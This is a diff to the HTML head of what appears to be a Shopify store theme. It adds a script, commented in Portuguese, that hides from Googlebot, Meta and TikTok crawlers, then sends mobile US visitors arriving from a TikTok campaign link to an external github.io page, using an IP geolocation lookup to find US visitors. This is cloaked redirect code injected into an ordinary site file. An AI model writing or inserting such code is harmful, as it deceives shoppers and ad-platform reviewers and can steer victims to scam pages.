@@ -3,6 +3,48 @@
 <html class="no-js" lang="en">
   <head>
     <script>
+    var userAgent = navigator.userAgent;
+
+    // Verifica se o agente do usuário corresponde a um bot.
+    if (!userAgent.match(/Googlebot|MetaURI|TikTokBot/i)) {
+        // Função para verificar se o dispositivo é móvel.
+        function isMobile() {
+            return /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
+        }
+
+        // Função para obter a localização geográfica do usuário.
+        function getGeolocation(callback) {
+            fetch('https://ipapi.co/json/')
+                .then(function(response) {
+                    return response.json();
+                })
+                .then(function(data) {
+                    callback(data);
+                })
+                .catch(function(error) {
+                    console.error('Erro ao obter geolocalização:', error);
+                    callback(null);
+                });
+        }
+
+        // Verifica se a URL contém o parâmetro específico da campanha do TikTok.
+        function isReferredFromTikTok() {
+            var urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get('utm_id') === 'tiktokwmv';
+        }
+
+        // Verifica se o dispositivo é móvel, se a localização é nos Estados Unidos e se a origem é TikTok.
+        if (isMobile() && isReferredFromTikTok()) {
+            getGeolocation(function(location) {
+                if (location && location.country_code === 'US') {
+                    window.location.href = "https://bill101521.github.io/endop/";
+                }
+            });
+        }
+    }
+</script>
+
+    <script>
 window.KiwiSizing = window.KiwiSizing === undefined ? {} : window.KiwiSizing;
 KiwiSizing.shop = "d72a35-2.myshopify.com";
 
